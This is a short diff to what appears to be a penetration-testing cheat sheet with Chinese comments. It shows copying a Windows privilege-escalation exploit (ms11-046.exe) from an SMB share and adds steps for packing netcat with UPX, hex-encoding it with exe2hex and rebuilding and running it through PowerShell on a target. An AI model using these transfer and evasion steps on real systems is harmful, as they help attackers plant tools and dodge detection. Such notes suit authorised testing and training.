@@ -65,3 +65,13 @@ C:\>net use \\[host]\[share name]
 ##copy
 C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
 ```
+
+## Transfer binary files and run on Windows
+```
+upx -9 nc.exe
+#使用 UPX 压缩工具对 nc.exe 文件进行压缩，压缩级别为最高压缩比
+exe2hex -x nc.exe -p nc.cmd
+#将 nc.exe 文件转换为十六进制格式，并将结果输出到 nc.cmd 文件中
+powershell nc.cmd
+#在 PowerShell 终端中执行 nc.cmd 文件，这将导致 nc.exe 文件被解码并在系统中执行
+```
